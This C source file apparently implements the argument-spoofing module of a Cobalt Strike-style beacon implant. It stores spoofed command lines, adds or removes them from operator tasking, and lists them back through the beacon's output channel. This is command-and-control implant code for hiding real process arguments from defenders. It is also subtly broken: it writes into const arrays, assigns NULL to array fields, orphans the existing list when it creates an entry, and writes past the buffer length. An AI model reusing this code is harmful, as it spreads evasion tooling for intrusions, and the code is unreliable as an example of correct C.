#include "pch.h"

#include "argument.h"

#include "beacon.h"
#include "utils.h"

typedef struct _ARGUMENT_ENTRY
{
	BOOL isActive;
	const char expandedCmd[8192];
	const char expandedFullCmd[8192];
	struct _ARGUMENT_ENTRY* next;
} ARGUMENT_ENTRY;

ARGUMENT_ENTRY* gArguments = NULL;

BOOL ArgumentFindMatch(EXPANDED_CMD* extendedCmd, const char* cmd)
{
	for (const ARGUMENT_ENTRY* current = gArguments; current != NULL; current = current->next)
	{
		if (current->isActive && strstr(cmd, current->expandedCmd) == cmd)
		{
			*extendedCmd = (EXPANDED_CMD) { current->expandedFullCmd, current->expandedCmd };
			return TRUE;
		}
	}

	return FALSE;
}

ARGUMENT_ENTRY* ArgumentFindOrCreate(char* expanded)
{
	for (ARGUMENT_ENTRY* current = gArguments; current != NULL; current = current->next)
	{
		if (!current->isActive && strcmp(expanded, current->expandedCmd) == 0)
			return current;
	}

	ARGUMENT_ENTRY* current = gArguments;

	while(current && current->isActive)
		current = current->next;

	ARGUMENT_ENTRY* argument;
	if (!current)
	{
		// Create a new entry for the new argument
		argument = (ARGUMENT_ENTRY*)malloc(sizeof(ARGUMENT_ENTRY));
		*argument = (ARGUMENT_ENTRY){ .isActive = FALSE, .expandedCmd = NULL, .expandedFullCmd = NULL, .next = current };
		gArguments = argument;
	} else
	{
		// Reuse this entry for the new argument
		argument = current;
	}

	return argument;
}

void ArgumentAdd(char* buffer, int length)
{
#define MAX_ORIGINAL 0x2000
#define MAX_EXPANDED 0x2000
#define MAX_EXPANDED_FULL 0x2000
	datap* locals = BeaconDataAlloc(MAX_ORIGINAL + MAX_EXPANDED + MAX_EXPANDED_FULL);

	char* original = BeaconDataPtr(locals, MAX_ORIGINAL);
	char* expanded = BeaconDataPtr(locals, MAX_EXPANDED);
	char* expandedFull = BeaconDataPtr(locals, MAX_EXPANDED_FULL);

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	BeaconDataStringCopySafe(&parser, original, MAX_ORIGINAL);
	ExpandEnvironmentStrings_s(original, expanded, MAX_EXPANDED);
	BeaconDataStringCopySafe(&parser, expandedFull, MAX_EXPANDED_FULL);

	ARGUMENT_ENTRY* argument = ArgumentFindOrCreate(expanded);
	argument->isActive = TRUE;

	ExpandEnvironmentStrings_s(original, argument->expandedCmd, MAX_EXPANDED);
	ExpandEnvironmentStrings_s(expandedFull, argument->expandedFullCmd, MAX_EXPANDED_FULL);

	BeaconDataFree(locals);
}

void ArgumentRemove(char* buffer, int length)
{
	char* expanded = malloc(MAX_EXPANDED);
	buffer[length] = '\0';
	ExpandEnvironmentStrings_s(buffer, expanded, MAX_EXPANDED);
	// For each active argument
	for (ARGUMENT_ENTRY* current = gArguments; current != NULL; current = current->next)
	{
		if (current->isActive && strcmp(expanded, current->expandedCmd) == 0)
		{
			current->isActive = FALSE;
			*current = (ARGUMENT_ENTRY){ .isActive = FALSE, .expandedCmd = NULL, .expandedFullCmd = NULL, .next = current->next };
			break;
		}
	}
	free(expanded);
}

void ArgumentList()
{
	formatp format;
	BeaconFormatAlloc(&format, 0x8000);
	for (ARGUMENT_ENTRY* current = gArguments; current != NULL; current = current->next)
	{
		if (current->isActive)
		{
			BeaconFormatPrintf(&format, "%s\n", current->expandedFullCmd);
		}
	}

	int size = BeaconDataLength(&format);
	char* buffer = BeaconDataOriginal(&format);
	BeaconOutput(CALLBACK_OUTPUT, buffer, size);

	BeaconFormatFree(&format);
}